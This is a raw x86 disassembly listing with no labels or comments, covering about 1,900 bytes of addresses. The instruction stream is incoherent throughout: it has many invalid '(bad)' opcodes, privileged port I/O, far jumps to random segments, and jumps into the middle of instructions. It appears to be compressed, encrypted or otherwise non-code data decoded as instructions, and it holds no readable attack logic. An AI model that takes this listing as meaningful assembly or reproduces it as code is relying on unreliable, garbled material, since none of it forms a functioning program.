  40c2f5:	lods   al,BYTE PTR ds:[esi]
  40c2f6:	mov    dl,0xd5
  40c2f8:	push   edx
  40c2f9:	jmp    0x40c2d4
  40c2fb:	mov    ecx,DWORD PTR [esi-0x2d0b0337]
  40c301:	dec    ebp
  40c302:	and    eax,0xb4b3b7f5
  40c307:	push   0x42
  40c309:	(bad)  
  40c30a:	push   esp
  40c30b:	or     bh,BYTE PTR [edx]
  40c30d:	mov    eax,ds:0x6751e730
  40c312:	jo     0x40c355
  40c314:	jmp    0x7946:0x706d4f0e
  40c31b:	outs   dx,BYTE PTR ds:[esi]
  40c31c:	cs adc esi,ecx
  40c31f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c321:	inc    ecx
  40c322:	jns    0x40c2da
  40c324:	push   esp
  40c325:	or     ah,ah
  40c327:	jne    0x40c2d4
  40c329:	jae    0x40c324
  40c32b:	mov    bl,0x9b
  40c32d:	inc    ebx
  40c32e:	xlat   BYTE PTR ds:[ebx]
  40c32f:	mov    edi,DWORD PTR gs:[ecx-0xe]
  40c333:	aas    
  40c334:	xchg   BYTE PTR [ebx],ch
  40c336:	push   0x6b
  40c338:	je     0x40c2bd
  40c33a:	ficom  DWORD PTR [eax+0x353ecc9f]
  40c340:	inc    edx
  40c341:	arpl   WORD PTR [ebx+edx*2-0xf819135],sp
  40c348:	sub    DWORD PTR ds:0x890aaf91,ebx
  40c34e:	cmp    BYTE PTR [ebx-0x13],dl
  40c351:	push   ds
  40c352:	cli    
  40c353:	sub    BYTE PTR [edx],ah
  40c355:	mov    edx,0xbf8a7b2c
  40c35a:	mov    ebx,0x3287d497
  40c35f:	test   DWORD PTR [esi],esp
  40c361:	adc    al,BYTE PTR ds:0x6b50efc5
  40c367:	out    dx,al
  40c368:	je     0x40c3c4
  40c36a:	outs   dx,DWORD PTR ds:[esi]
  40c36b:	outs   dx,DWORD PTR ds:[esi]
  40c36c:	gs retf 0xba3f
  40c370:	stos   DWORD PTR es:[edi],eax
  40c371:	jae    0x40c3e3
  40c373:	jbe    0x40c367
  40c375:	stc    
  40c376:	inc    esi
  40c377:	mov    ch,cl
  40c379:	xchg   esp,eax
  40c37a:	ret    0xa4c9
  40c37d:	push   esp
  40c37e:	rcl    eax,1
  40c380:	into   
  40c381:	push   esp
  40c382:	stos   BYTE PTR es:[edi],al
  40c383:	add    DWORD PTR [ebx],esi
  40c385:	dec    edx
  40c386:	cwde   
  40c387:	push   eax
  40c388:	push   0x19f0649e
  40c38d:	jno    0x40c3e6
  40c38f:	test   BYTE PTR [ebx-0x1e7d60b7],dh
  40c395:	es pop esp
  40c397:	fidiv  DWORD PTR [ebx]
  40c399:	adc    eax,0xa3bd5fc3
  40c39e:	xchg   esi,eax
  40c39f:	jg     0x40c3e9
  40c3a1:	sbb    eax,0x16b0acf
  40c3a6:	inc    edx
  40c3a7:	sar    BYTE PTR [ebp+eax*1-0x45e01acf],1
  40c3ae:	mov    esp,0xf9311895
  40c3b3:	(bad)  
  40c3b4:	outs   dx,DWORD PTR ds:[esi]
  40c3b5:	aam    0x25
  40c3b7:	mov    ebx,0x64b92af1
  40c3bc:	lds    eax,FWORD PTR [esi+eiz*1]
  40c3bf:	rol    BYTE PTR ds:0xf62ce93c,1
  40c3c5:	call   0x29d2:0x474414ef
  40c3cc:	mov    ecx,0x14d7214a
  40c3d1:	mov    dh,ch
  40c3d3:	fwait
  40c3d4:	in     al,dx
  40c3d5:	push   edi
  40c3d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3d7:	push   esi
  40c3d8:	add    dh,BYTE PTR [edi-0x1db856d3]
  40c3de:	pushf  
  40c3df:	popa   
  40c3e0:	pop    ebx
  40c3e1:	pop    esi
  40c3e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3e3:	sub    DWORD PTR [edi],ecx
  40c3e5:	aas    
  40c3e6:	jecxz  0x40c45c
  40c3e8:	mov    al,0x19
  40c3ea:	mov    ds:0x95237b37,al
  40c3ef:	dec    esp
  40c3f0:	cmp    BYTE PTR [ebp+0x71],0x7
  40c3f4:	mov    ah,0xf4
  40c3f6:	fisubr DWORD PTR [edi+0x21e316ee]
  40c3fc:	ins    BYTE PTR es:[edi],dx
  40c3fd:	mov    eax,0x3fa35b10
  40c402:	dec    esp
  40c403:	xchg   ecx,eax
  40c404:	lods   eax,DWORD PTR ds:[esi]
  40c405:	nop
  40c406:	mov    ecx,0x19475696
  40c40b:	sbb    BYTE PTR [edx+0x77cfdcf4],bl
  40c411:	dec    edx
  40c412:	pusha  
  40c413:	pop    esi
  40c414:	in     al,0xeb
  40c416:	xchg   edx,eax
  40c417:	jnp    0x40c462
  40c419:	out    dx,al
  40c41a:	dec    ebx
  40c41b:	fistp  DWORD PTR [edi+0x66]
  40c41e:	cmp    esp,DWORD PTR [edi+ecx*4+0x75f3d6c0]
  40c425:	inc    esp
  40c426:	adc    eax,0x7eb52170
  40c42b:	push   esp
  40c42c:	pop    eax
  40c42d:	mov    WORD PTR [ebp+0x555e6933],?
  40c433:	test   BYTE PTR [eax],bl
  40c435:	adc    BYTE PTR [ecx],ch
  40c437:	xchg   edi,eax
  40c438:	mov    eax,ds:0x658914f1
  40c43d:	xor    BYTE PTR [ebx-0x491d00f4],ah
  40c443:	jl     0x40c484
  40c445:	outs   dx,BYTE PTR ds:[esi]
  40c446:	jle    0x40c4ac
  40c448:	sub    al,0xa0
  40c44a:	xor    BYTE PTR [ecx+0x60110bf3],bh
  40c450:	fbld   TBYTE PTR [eax-0x2d91a05e]
  40c456:	pop    ds
  40c457:	jae    0x40c438
  40c459:	xchg   esi,eax
  40c45a:	mov    cl,0xc3
  40c45c:	push   ds
  40c45d:	sub    al,0xea
  40c45f:	fcomp  st(5)
  40c461:	xchg   ebp,eax
  40c462:	sub    BYTE PTR [edi-0x4d],ah
  40c465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c467:	xor    eax,0x928f92d2
  40c46c:	mov    ch,BYTE PTR [ebp+ebx*8-0x38]
  40c470:	adc    dl,dl
  40c472:	mov    esi,0xff8d6e72
  40c477:	fistp  WORD PTR [ebx+0x13]
  40c47a:	mov    ecx,0x561075a7
  40c47f:	dec    ebx
  40c480:	pop    edx
  40c481:	jg     0x40c46b
  40c483:	inc    ebx
  40c484:	mov    edx,0xe4396260
  40c489:	mov    ecx,0xed52674
  40c48e:	leave  
  40c48f:	shl    esp,1
  40c491:	mov    esp,0x14ec03f1
  40c496:	das    
  40c497:	retf   
  40c498:	das    
  40c499:	or     eax,0x23963f68
  40c49e:	pop    edx
  40c49f:	jge    0x40c4b5
  40c4a1:	jne    0x40c47f
  40c4a3:	lds    edx,FWORD PTR [edx+0x36]
  40c4a6:	lods   al,BYTE PTR ds:[esi]
  40c4a7:	pop    eax
  40c4a8:	dec    esp
  40c4a9:	int    0x89
  40c4ab:	(bad)  
  40c4ac:	jnp    0x40c4b5
  40c4ae:	xchg   BYTE PTR [edi],bh
  40c4b0:	nop
  40c4b1:	mov    ah,0xa3
  40c4b3:	sbb    BYTE PTR [edx+esi*1+0x72],dl
  40c4b7:	sti    
  40c4b8:	mov    esp,0x576cefef
  40c4bd:	(bad)  
  40c4be:	or     dh,dl
  40c4c0:	jne    0x40c4b3
  40c4c2:	xchg   ah,bl
  40c4c4:	lds    edx,FWORD PTR [esi-0x2d]
  40c4c7:	xchg   edx,eax
  40c4c8:	lds    ebp,FWORD PTR [ecx+eax*1]
  40c4cb:	aas    
  40c4cc:	push   ds
  40c4cd:	sub    al,0xd8
  40c4cf:	les    esi,FWORD PTR [esi-0x6809ec4c]
  40c4d5:	je     0x40c4fd
  40c4d7:	fdivrp st(7),st
  40c4d9:	pop    ss
  40c4da:	lea    edi,[edx+0x12]
  40c4dd:	ret    0xcbe3
  40c4e0:	xlat   BYTE PTR ds:[ebx]
  40c4e1:	enter  0xb297,0x79
  40c4e5:	ss test eax,0xab1f41ee
  40c4eb:	mov    ebp,0x2259896f
  40c4f0:	cwde   
  40c4f1:	inc    eax
  40c4f2:	shr    dh,0xb3
  40c4f5:	iret   
  40c4f6:	(bad)  
  40c4f7:	ja     0x40c50b
  40c4f9:	or     BYTE PTR [edx-0x4823ad7c],0xc6
  40c500:	test   eax,eax
  40c502:	test   BYTE PTR [edx],ah
  40c504:	iret   
  40c505:	mov    eax,0x379f4a8b
  40c50a:	push   es
  40c50b:	cmp    BYTE PTR ds:0x49137703,bl
  40c511:	aad    0x99
  40c513:	sti    
  40c514:	sbb    BYTE PTR [edi],al
  40c516:	cmp    dh,BYTE PTR [ebx+0x65702596]
  40c51c:	in     eax,dx
  40c51d:	test   eax,0xc9500637
  40c522:	add    DWORD PTR [ebx+0x10],ebp
  40c525:	mov    ebx,0x5b84ba98
  40c52a:	xor    dl,ah
  40c52c:	fsubp  st(5),st
  40c52e:	jns    0x40c4f2
  40c530:	out    dx,al
  40c531:	gs jmp 0x41fc:0xac3126a
  40c539:	ins    BYTE PTR es:[edi],dx
  40c53a:	dec    esp
  40c53b:	fsubr  st(7),st
  40c53d:	cld    
  40c53e:	shl    BYTE PTR [edi-0x12],1
  40c541:	sbb    eax,0xe026c2e3
  40c546:	or     al,0xee
  40c548:	(bad)  
  40c549:	shl    ebp,0x31
  40c54c:	popf   
  40c54d:	pop    ebp
  40c54e:	or     DWORD PTR [ebx-0x36],ebx
  40c551:	add    eax,0x254b5e30
  40c556:	inc    ebx
  40c557:	in     al,0x38
  40c559:	test   al,0x5c
  40c55b:	jg     0x40c590
  40c55d:	push   edi
  40c55e:	inc    ecx
  40c55f:	retf   0xa093
  40c562:	cmp    ebx,DWORD PTR [ebp+ecx*2-0x36]
  40c566:	xor    BYTE PTR [edi+ecx*8],al
  40c569:	inc    ebp
  40c56a:	xor    BYTE PTR [ecx+0x33],dh
  40c56d:	mov    ch,0xc1
  40c56f:	ins    BYTE PTR es:[edi],dx
  40c570:	sub    eax,0xa6c390df
  40c575:	dec    esp
  40c576:	std    
  40c577:	xchg   ecx,eax
  40c578:	dec    ebp
  40c579:	cmp    eax,0xbfce84f1
  40c57e:	xor    dl,BYTE PTR [edx+0x10]
  40c581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c582:	push   edx
  40c583:	cmp    ah,bl
  40c585:	cmp    ebp,DWORD PTR [esi]
  40c587:	mov    eax,0xae60f9c9
  40c58c:	pop    ecx
  40c58d:	outs   dx,DWORD PTR ds:[esi]
  40c58e:	in     al,dx
  40c58f:	dec    ecx
  40c590:	add    cl,BYTE PTR ds:0x33cfd92c
  40c596:	clc    
  40c597:	cmp    bh,BYTE PTR [edx+0x35]
  40c59a:	bound  edx,QWORD PTR [esi]
  40c59c:	icebp  
  40c59d:	add    al,0xe5
  40c59f:	leave  
  40c5a0:	sub    esi,esi
  40c5a2:	cmp    ch,BYTE PTR [ebx+eiz*8]
  40c5a5:	ins    BYTE PTR es:[edi],dx
  40c5a6:	pop    es
  40c5a7:	push   0x74
  40c5a9:	xchg   ecx,eax
  40c5aa:	mov    esp,0x1a21b3b5
  40c5af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5b0:	jo     0x40c595
  40c5b2:	push   ss
  40c5b3:	imul   eax,ebp,0xf36c3417
  40c5b9:	repz push es
  40c5bb:	xchg   edx,eax
  40c5bc:	dec    esi
  40c5bd:	pop    eax
  40c5be:	sub    esp,DWORD PTR [edx-0x50dd07a3]
  40c5c4:	in     eax,dx
  40c5c5:	push   ss
  40c5c6:	and    BYTE PTR [esi+0x1a],0x40
  40c5ca:	mov    ecx,ecx
  40c5cc:	idiv   DWORD PTR ss:[edi-0x6db01bdc]
  40c5d3:	repnz in eax,0x26
  40c5d6:	or     ebx,DWORD PTR [eax-0x14]
  40c5d9:	or     dh,BYTE PTR [ecx]
  40c5db:	(bad)  
  40c5dc:	cmp    DWORD PTR [ecx+eiz*1-0x702e9180],ecx
  40c5e3:	xor    esp,esp
  40c5e5:	test   BYTE PTR [ebx+eiz*2],0x25
  40c5e9:	and    DWORD PTR [ecx-0x721f8097],esp
  40c5ef:	int    0x5e
  40c5f1:	cdq    
  40c5f2:	rcl    DWORD PTR ds:0xa992660e,cl
  40c5f8:	in     eax,0x7d
  40c5fa:	jg     0x40c5de
  40c5fc:	add    al,0x51
  40c5fe:	imul   esp,DWORD PTR [ecx],0x40c24330
  40c604:	pop    edi
  40c605:	inc    edi
  40c606:	daa    
  40c607:	jecxz  0x40c620
  40c609:	or     DWORD PTR [ecx+ebp*8+0x63fb1e3],edi
  40c610:	cmp    ah,BYTE PTR [esi-0x10]
  40c613:	sub    BYTE PTR [eax-0x4fa422cc],al
  40c619:	je     0x40c627
  40c61b:	lock fsub DWORD PTR [ebp-0x5c]
  40c61f:	arpl   WORD PTR [edi],ax
  40c621:	adc    dh,BYTE PTR [esi]
  40c623:	sub    DWORD PTR [ebp+0x17],ebp
  40c626:	loop   0x40c63a
  40c628:	xchg   DWORD PTR [edx-0x4c],edx
  40c62b:	dec    esi
  40c62c:	jg     0x40c69e
  40c62e:	icebp  
  40c62f:	sub    DWORD PTR [ebp-0x15ec11f8],esp
  40c635:	les    ecx,FWORD PTR [edi+0x4884db02]
  40c63b:	xchg   edx,eax
  40c63c:	pop    edx
  40c63d:	les    edi,FWORD PTR [eax]
  40c63f:	shl    BYTE PTR [eax-0x1b],1
  40c642:	pop    ecx
  40c643:	mov    ecx,0x8ccd9b21
  40c648:	sbb    DWORD PTR [edi],edx
  40c64a:	cli    
  40c64b:	leave  
  40c64c:	mul    BYTE PTR [esi-0x3a319ce0]
  40c652:	xor    edi,DWORD PTR [ecx]
  40c654:	stos   DWORD PTR es:[edi],eax
  40c655:	or     dh,BYTE PTR [ebx-0x49]
  40c658:	jbe    0x40c69f
  40c65a:	or     dh,BYTE PTR [ebx+edx*4-0x161527dd]
  40c661:	jb     0x40c6cf
  40c663:	adc    esp,DWORD PTR [ecx-0x28]
  40c666:	jl     0x40c6c1
  40c668:	push   esi
  40c669:	sub    DWORD PTR [esi+0x6b],edx
  40c66c:	adc    al,0xb8
  40c66e:	mov    ah,0x60
  40c670:	adc    ebp,DWORD PTR [di]
  40c673:	pop    ss
  40c674:	fadd   DWORD PTR [eax-0x1fa64f6b]
  40c67a:	aad    0x3e
  40c67c:	xor    edi,ebp
  40c67e:	push   esi
  40c67f:	out    dx,eax
  40c680:	push   ss
  40c681:	sub    DWORD PTR [ecx-0x13b067f0],esp
  40c687:	jnp    0x40c68b
  40c689:	xchg   edi,eax
  40c68a:	mov    ds:0x7b7e58dd,al
  40c68f:	lea    edx,[edi]
  40c691:	cli    
  40c692:	mov    BYTE PTR [esi],ah
  40c694:	push   ebx
  40c695:	push   ss
  40c696:	xor    al,0xda
  40c698:	push   ds
  40c699:	(bad)  
  40c69a:	sbb    al,0xc8
  40c69c:	in     al,dx
  40c69d:	and    BYTE PTR [eax+0x3a],ch
  40c6a0:	out    0x60,eax
  40c6a2:	and    BYTE PTR [edi-0x7165187a],dh
  40c6a8:	cwde   
  40c6a9:	movups xmm1,xmm4
  40c6ac:	jnp    0x40c680
  40c6ae:	xchg   ebp,eax
  40c6af:	stc    
  40c6b0:	das    
  40c6b1:	sar    DWORD PTR [ebx],cl
  40c6b3:	push   dx
  40c6b5:	fucomi st,st(4)
  40c6b7:	ins    BYTE PTR es:[edi],dx
  40c6b8:	push   edi
  40c6b9:	rcr    eax,cl
  40c6bb:	sbb    ah,BYTE PTR [edx-0x62]
  40c6be:	and    al,0x4e
  40c6c0:	daa    
  40c6c1:	aas    
  40c6c2:	repz mov al,ds:0xdbdd7522
  40c6c8:	and    BYTE PTR [ebp-0x9],ch
  40c6cb:	pusha  
  40c6cc:	scas   al,BYTE PTR es:[edi]
  40c6cd:	jns    0x40c6f2
  40c6cf:	in     eax,dx
  40c6d0:	xchg   edx,eax
  40c6d1:	jne    0x40c6f0
  40c6d3:	xchg   esp,eax
  40c6d4:	psllw  mm1,QWORD PTR [ebx]
  40c6d7:	mov    cl,0x68
  40c6d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6da:	jmp    0xc265b647
  40c6df:	xchg   esp,eax
  40c6e0:	(bad)  
  40c6e1:	adc    eax,ebx
  40c6e3:	es cmp eax,0xf7d2d43f
  40c6e9:	dec    BYTE PTR [eax+0x0]
  40c6ec:	adc    bh,cl
  40c6ee:	loope  0x40c6ed
  40c6f0:	ficom  WORD PTR [ebx-0x103b8e2e]
  40c6f6:	imul   edi,DWORD PTR [esi],0xee58da00
  40c6fc:	add    DWORD PTR ds:0x10a7dc4a,esp
  40c702:	imul   BYTE PTR [ebx+ebx*8-0x52]
  40c706:	mov    al,0x6
  40c708:	loope  0x40c723
  40c70a:	mov    dl,0x88
  40c70c:	jmp    0x3325:0xef4584f
  40c713:	xchg   BYTE PTR [esi-0x3a],bh
  40c716:	mov    ebx,0xa69b5ee7
  40c71b:	sbb    DWORD PTR [eax],ecx
  40c71d:	jge    0x40c77f
  40c71f:	and    al,0xf3
  40c721:	or     BYTE PTR [ecx+0xa],bh
  40c724:	out    0xcc,eax
  40c726:	out    dx,eax
  40c727:	push   cs
  40c728:	arpl   WORD PTR [ebx+0x5a],si
  40c72b:	cmp    ah,dh
  40c72d:	dec    ebx
  40c72e:	mov    edx,0x3ff7dd35
  40c733:	lds    eax,FWORD PTR [eax-0x33ae17c1]
  40c739:	fisub  DWORD PTR [eax]
  40c73b:	aad    0xab
  40c73d:	ja     0x40c77a
  40c73f:	mov    BYTE PTR [ebx],bl
  40c741:	inc    ebx
  40c742:	fist   WORD PTR [ecx+0x1e8a6cd]
  40c748:	or     dh,bl
  40c74a:	mov    DWORD PTR [edi],0xb8f66931
  40c750:	fmul   QWORD PTR [edi-0x7f728d6]
  40c756:	mov    BYTE PTR ds:0x4cc28ba,bl
  40c75c:	sbb    eax,0x43a453c7
  40c761:	retf   0xcd2a
  40c764:	pusha  
  40c765:	gs cmp eax,0xe06d6883
  40c76b:	adc    eax,0x419700b7
  40c770:	call   0xa49800b2
  40c775:	punpckldq mm4,DWORD PTR [eax+0x1b2055fe]
  40c77c:	shr    DWORD PTR [edi-0x58],1
  40c77f:	in     eax,0xc1
  40c781:	fisttp WORD PTR [esi]
  40c783:	xor    al,0x82
  40c785:	mov    dl,0xf2
  40c787:	sahf   
  40c788:	addr16 xchg ebp,eax
  40c78a:	push   edx
  40c78b:	fsubr  st(2),st
  40c78d:	xchg   edx,eax
  40c78e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c78f:	xor    dh,BYTE PTR [eax]
  40c791:	call   0xdde0:0xd534962d
  40c798:	adc    BYTE PTR [esi+0x6e],dh
  40c79b:	dec    ebx
  40c79c:	out    0x26,eax
  40c79e:	and    bh,BYTE PTR [ebx]
  40c7a0:	add    eax,0x5bfda7c1
  40c7a5:	test   BYTE PTR [ebx],0xa4
  40c7a8:	pop    ds
  40c7a9:	pop    es
  40c7aa:	es adc ebx,edi
  40c7ad:	sub    eax,0x1eb3c9c4
  40c7b2:	sahf   
  40c7b3:	aam    0x23
  40c7b5:	sub    ecx,DWORD PTR [ecx]
  40c7b7:	(bad)  
  40c7b8:	mov    ebp,0xa5ba7ad9
  40c7bd:	retf   
  40c7be:	push   eax
  40c7bf:	(bad)  
  40c7c0:	int3   
  40c7c1:	mov    ds:0x4432131c,eax
  40c7c6:	imul   eax,ebp,0x5b
  40c7c9:	(bad)  
  40c7ca:	int3   
  40c7cb:	cmc    
  40c7cc:	sub    edi,DWORD PTR [ecx+0x5ead5b55]
  40c7d2:	scas   al,BYTE PTR es:[edi]
  40c7d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7d4:	aas    
  40c7d5:	mov    esp,0xcf47a30b
  40c7da:	and    eax,0x96fb3f8c
  40c7df:	test   al,0x5b
  40c7e1:	inc    ebx
  40c7e2:	xor    al,0xca
  40c7e4:	pop    eax
  40c7e5:	sub    DWORD PTR [ebx+eiz*4-0x6b],edx
  40c7e9:	pop    edx
  40c7ea:	push   0xffffffd3
  40c7ec:	mov    al,0x82
  40c7ee:	jle    0x40c81f
  40c7f0:	push   ecx
  40c7f1:	js     0x40c797
  40c7f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7f4:	cmp    DWORD PTR [esp+edx*4],ebx
  40c7f7:	scas   al,BYTE PTR es:[edi]
  40c7f8:	dec    ecx
  40c7f9:	sub    BYTE PTR [ebp-0x278c1dd2],0x22
  40c800:	mov    ds:0xaf9ebbc7,eax
  40c805:	add    DWORD PTR [eax+0x2c],edi
  40c808:	jae    0x40c883
  40c80a:	lea    edi,[ebx]
  40c80c:	xor    al,0xc6
  40c80e:	enter  0x2f3b,0xa3
  40c812:	lods   al,BYTE PTR ds:[esi]
  40c813:	imul   ebx,DWORD PTR [eax],0x90851d66
  40c819:	push   ebx
  40c81a:	and    BYTE PTR [edi],bh
  40c81c:	mov    ds:0x45186b92,al
  40c821:	fistp  WORD PTR [ebx-0xd]
  40c824:	je     0x40c81f
  40c826:	mov    edx,0xb970f43d
  40c82b:	xlat   BYTE PTR ds:[ebx]
  40c82c:	es fucomi st,st(1)
  40c82f:	mov    al,ds:0x640d6be
  40c834:	addr16 jp 0x40c819
  40c837:	adc    BYTE PTR ds:0xfcb1ce20,bh
  40c83d:	cmp    al,0x6d
  40c83f:	mov    esp,0x6f9b7445
  40c844:	pop    esi
  40c845:	je     0x40c84b
  40c847:	mov    DWORD PTR [eax-0x23],esp
  40c84a:	fiadd  WORD PTR [ecx]
  40c84c:	in     al,dx
  40c84d:	aad    0x1f
  40c84f:	cmp    al,0xf9
  40c851:	ror    DWORD PTR [eax+0x281cf558],1
  40c857:	cwde   
  40c858:	test   dl,0x29
  40c85b:	cmp    al,0xb7
  40c85d:	cs fprem 
  40c860:	xlat   BYTE PTR ds:[ebx]
  40c861:	inc    edx
  40c862:	pushf  
  40c863:	jp     0x40c8e3
  40c865:	jmp    0xa349:0x87771521
  40c86c:	dec    ecx
  40c86d:	dec    DWORD PTR [eax+0x271261e5]
  40c873:	test   al,0x5a
  40c875:	push   edi
  40c876:	ret    
  40c877:	ins    DWORD PTR es:[edi],dx
  40c878:	fidivr DWORD PTR [esi+0x2]
  40c87b:	outs   dx,DWORD PTR ds:[esi]
  40c87c:	sub    cl,BYTE PTR [edi+0x18]
  40c87f:	and    DWORD PTR [edx+0x2f8b6007],ebx
  40c885:	mov    ebp,0xba8d616b
  40c88a:	jle    0x40c821
  40c88c:	mov    cl,0x47
  40c88e:	adc    al,0xac
  40c890:	je     0x40c90d
  40c892:	fist   WORD PTR [ecx-0x47]
  40c895:	jbe    0x40c81a
  40c897:	imul   esi,DWORD PTR [edi-0x33],0x10
  40c89b:	inc    esi
  40c89c:	add    al,0x94
  40c89e:	(bad)  
  40c8a0:	dec    edi
  40c8a1:	jb     0x40c921
  40c8a3:	adc    ch,BYTE PTR [edi+0x54]
  40c8a6:	(bad)  
  40c8a7:	jnp    0x40c884
  40c8a9:	cwde   
  40c8aa:	adc    BYTE PTR [esi+0x36],cl
  40c8ad:	in     al,0xd9
  40c8af:	jmp    0xfa58c64f
  40c8b4:	pop    ecx
  40c8b5:	cmc    
  40c8b6:	icebp  
  40c8b7:	repz in eax,dx
  40c8b9:	test   al,0xcd
  40c8bb:	sbb    DWORD PTR [edi+0x5d],0xd1728d19
  40c8c2:	scas   eax,DWORD PTR es:[edi]
  40c8c3:	rol    ch,cl
  40c8c5:	dec    eax
  40c8c6:	jb     0x40c84b
  40c8c8:	mov    ss,WORD PTR [eax-0x1280bf42]
  40c8ce:	pushf  
  40c8cf:	push   ecx
  40c8d0:	retf   
  40c8d1:	sub    edx,eax
  40c8d3:	mov    edi,0xe27fcc4a
  40c8d8:	popa   
  40c8d9:	ret    0xd0b0
  40c8dc:	retf   
  40c8dd:	dec    ebx
  40c8de:	xchg   ecx,eax
  40c8df:	shr    DWORD PTR [esi-0x12],1
  40c8e2:	push   ecx
  40c8e3:	clc    
  40c8e4:	xor    bl,BYTE PTR [eax]
  40c8e6:	cs mov ebp,0x5a3ea450
  40c8ec:	sub    al,0x7f
  40c8ee:	cmp    eax,0x73a17d9
  40c8f3:	xchg   esi,eax
  40c8f4:	aas    
  40c8f5:	xchg   ebx,eax
  40c8f6:	cmp    edx,ebx
  40c8f8:	dec    esi
  40c8f9:	test   BYTE PTR ss:[edx+0x2b],bh
  40c8fd:	out    dx,eax
  40c8fe:	ret    0x4d30
  40c901:	outs   dx,BYTE PTR ds:[esi]
  40c902:	mov    al,ds:0xe0ea9267
  40c907:	dec    ebx
  40c908:	loop   0x40c8c5
  40c90a:	adc    ecx,DWORD PTR [eax]
  40c90c:	add    edi,esi
  40c90e:	ficom  WORD PTR [eax-0x5071b73]
  40c914:	jb     0x40c944
  40c916:	in     eax,dx
  40c917:	mov    al,ds:0x92e065f0
  40c91c:	xchg   esi,eax
  40c91d:	je     0x40c93b
  40c91f:	ins    DWORD PTR es:[edi],dx
  40c920:	jbe    0x40c946
  40c922:	adc    esi,0x60b5cf92
  40c928:	adc    eax,0x1fecc4a0
  40c92d:	lea    esi,[ebp+0xa]
  40c930:	jmp    0x40c963
  40c932:	nop    ebp
  40c935:	mov    esi,0x6a765df2
  40c93a:	mov    ebp,0x2a634da6
  40c93f:	ret    
  40c940:	shl    eax,0xe2
  40c943:	icebp  
  40c944:	ins    BYTE PTR es:[edi],dx
  40c945:	fdiv   st(3),st
  40c947:	leave  
  40c948:	in     al,dx
  40c949:	dec    eax
  40c94a:	es inc ebp
  40c94c:	xchg   DWORD PTR [edx+0x2859c28e],esp
  40c952:	sti    
  40c953:	cld    
  40c954:	and    esp,DWORD PTR [edi-0x2d]
  40c957:	adc    cl,al
  40c959:	push   ss
  40c95a:	sahf   
  40c95b:	sub    al,0xfe
  40c95d:	cwde   
  40c95e:	mul    DWORD PTR [esi+0x5abecae1]
  40c964:	gs or  eax,0xd24ea73e
  40c96a:	xor    al,0xfd
  40c96c:	(bad)  
  40c96d:	fmulp  st(6),st
  40c96f:	sub    BYTE PTR [esi-0x26],bh
  40c972:	dec    ecx
  40c973:	sbb    DWORD PTR [ecx-0x2],ebx
  40c976:	outs   dx,BYTE PTR ds:[esi]
  40c977:	mov    al,0x95
  40c979:	add    DWORD PTR [edi+0x5a981173],esp
  40c97f:	enter  0x9e10,0xd8
  40c983:	ret    0xe228
  40c986:	ins    DWORD PTR es:[edi],dx
  40c987:	jae    0x40c9f5
  40c989:	in     al,0x67
  40c98b:	(bad)  
  40c98d:	int3   
  40c98e:	sbb    al,0xfa
  40c990:	mov    edi,0x8aad10ae
  40c995:	rcl    BYTE PTR [ebp-0x7b],0xa
  40c999:	mov    al,0x9
  40c99b:	nop
  40c99c:	pusha  
  40c99d:	dec    ebp
  40c99e:	enter  0x62ce,0x34
  40c9a2:	rol    DWORD PTR ds:0xc3df13a2,cl
  40c9a8:	addr16 sub al,0x0
  40c9ab:	nop
  40c9ac:	sbb    al,0xa
  40c9ae:	mov    ebx,DWORD PTR [ebx+0x6e568b83]
  40c9b4:	xor    al,BYTE PTR [ebx]
  40c9b6:	(bad)  
  40c9b7:	into   
  40c9b8:	adc    BYTE PTR [edx+0x5d],0xf
  40c9bc:	pop    edx
  40c9bd:	fist   WORD PTR [ebp+0x5b]
  40c9c0:	and    bh,BYTE PTR [ecx-0x3c0f6596]
  40c9c6:	loopne 0x40ca0d
  40c9c8:	sahf   
  40c9c9:	fs imul ecx,esi,0xffffffdc
  40c9cd:	cmp    eax,0xa86f0361
  40c9d2:	(bad)  [esi+0x1ea0b5db]
  40c9d8:	push   ebx
  40c9d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9da:	lods   eax,DWORD PTR ds:[esi]
  40c9db:	adc    ah,cl
  40c9dd:	xor    BYTE PTR [edx-0x17],0xaf
  40c9e1:	jno    0x40c973
  40c9e3:	stos   DWORD PTR es:[edi],eax
  40c9e4:	cdq    
  40c9e5:	inc    esi
  40c9e6:	push   esp
  40c9e7:	mov    ebx,0x88f66c9e
  40c9ec:	and    eax,0x479f976c
  40c9f1:	(bad)  
  40c9f2:	(bad)  
  40c9f3:	sbb    DWORD PTR [ebx+0x4465a26c],esi
  40c9f9:	pop    ds
  40c9fa:	ins    DWORD PTR es:[edi],dx
  40c9fb:	(bad)  
  40c9fd:	scas   eax,DWORD PTR es:[edi]
  40c9fe:	xchg   DWORD PTR [ecx],ebx
  40ca00:	xchg   edx,eax
  40ca01:	mov    bl,0xe8
  40ca03:	cmp    eax,0xa008d0bc
  40ca08:	push   cs
  40ca09:	aaa    
  40ca0a:	mov    edi,0xc6f8f543
  40ca0f:	add    ch,BYTE PTR [esi+0x785714f6]
  40ca15:	dec    ecx
  40ca16:	inc    eax
  40ca17:	fmul   DWORD PTR [edi]
  40ca19:	loope  0x40ca3a
  40ca1b:	adc    dh,al
  40ca1d:	push   edi
  40ca1e:	bound  eax,QWORD PTR [esi+eiz*4-0x35c3f3b6]
  40ca25:	sbb    eax,0xd1863dc2
  40ca2a:	clc    
  40ca2b:	or     BYTE PTR [edx-0x3],dh
  40ca2e:	(bad)  
  40ca30:	add    eax,0x81569c67
  40ca35:	or     edi,DWORD PTR [edx]
  40ca37:	ret    
  40ca38:	cld    
  40ca39:	inc    edx
  40ca3a:	pop    ebx
  40ca3b:	xchg   esp,eax
  40ca3c:	rcl    DWORD PTR [edx-0x609ba0d6],0x3e
  40ca43:	fstp   TBYTE PTR [eax+eiz*1]
  40ca46:	iret   
  40ca47:	xchg   esp,eax
  40ca48:	ss mov ebp,0xcf495ca2
